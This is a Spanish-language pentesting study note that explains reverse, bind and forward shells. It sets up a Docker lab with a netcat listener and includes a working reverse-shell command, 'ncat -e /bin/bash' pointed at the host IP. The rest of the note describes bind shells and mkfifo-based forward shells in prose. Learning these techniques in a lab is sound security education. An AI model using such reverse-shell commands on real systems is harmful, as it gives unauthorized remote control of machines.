
---------
- Tags: #ReverseShells #BindShells #ForwardShells
---------------
> **Reverse Shell**: Es una técnica que permite a un atacante conectarse a una máquina remota desde una máquina de su propiedad. Es decir, se establece una conexión desde la máquina comprometida hacia la máquina del atacante. Esto se logra ejecutando un programa malicioso o una instrucción específica en la máquina remota que establece la conexión de vuelta hacia la máquina del atacante, permitiéndole tomar el control de la máquina remota.

![[Ejemplo de Reverse Shells.png|896]]
- Creamos un archivo
```bin/bash
nvim dockerfile
```
- Desplegamos la maquina
```bin/bash
docker build -t webserver .
```
- En segundo plano con una consola virtual y de manera interactiva
```bin/bash
docker run -dit -p 80:80 --name myContainer my_image
```
- Conseguir una consola interactiva e instalamos ncat
```bin/bash
docker exec -it myContainer bash
apt install ncat
```
- Con la herramienta netcat ponernos en escucha
```bin/bash
nc -nlvp 443
```
- Desde la maquina interactiva en bash ponemos para recibir conexión
```bin/bash
ncat -e /bin/bash 172.17.0.1 443
```
- Para ver mejor el diseño en pantalla
```bin/bash
script /dev/null -c bash
```
>**Bind Shell**: Esta técnica es el opuesto de la Reverse Shell, ya que en lugar de que la máquina comprometida se conecte a la máquina del atacante, es el atacante quien se conecta a la máquina comprometida. El atacante escucha en un puerto determinado y la máquina comprometida acepta la conexión entrante en ese puerto. El atacante luego tiene acceso por consola a la máquina comprometida, lo que le permite tomar el control de la misma.

![[Ejemplo de BindShells.png]]

>**Forward Shell**: Esta técnica se utiliza cuando no se pueden establecer conexiones Reverse o Bind debido a reglas de Firewall implementadas en la red. Se logra mediante el uso de **mkfifo**, que crea un archivo **FIFO** (**named pipe**), que se utiliza como una especie de “**consola simulada**” interactiva a través de la cual el atacante puede operar en la máquina remota. En lugar de establecer una conexión directa, el atacante redirige el tráfico a través del archivo **FIFO**, lo que permite la comunicación bidireccional con la máquina remota.

![[Ejemplo de ForwardShells.png]]